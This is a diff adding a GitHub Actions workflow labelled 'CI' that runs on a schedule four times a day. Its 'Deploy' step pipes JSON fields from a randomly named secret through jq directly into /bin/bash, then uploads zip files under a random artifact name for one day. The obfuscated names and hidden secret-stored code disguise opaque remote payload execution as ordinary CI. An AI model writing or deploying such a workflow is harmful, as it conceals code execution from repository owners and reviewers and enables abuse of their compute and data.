@@ -1,0 +1,30 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '40 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          igi760: ${{ secrets.igi760 }}
+        run: |
+          printf '%s' "$igi760" | jq -r .vl227 | /bin/bash
+          printf '%s' "$u5799" | jq -r .xams37494 | /bin/bash
+          printf '%s' "$lkz49" | jq -r .v07 | /bin/bash
+          printf '%s' "$qxj53953" | jq -r .zhm0 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: Upc8Fo9K
+          path: "*.zip"
+          retention-days: 1
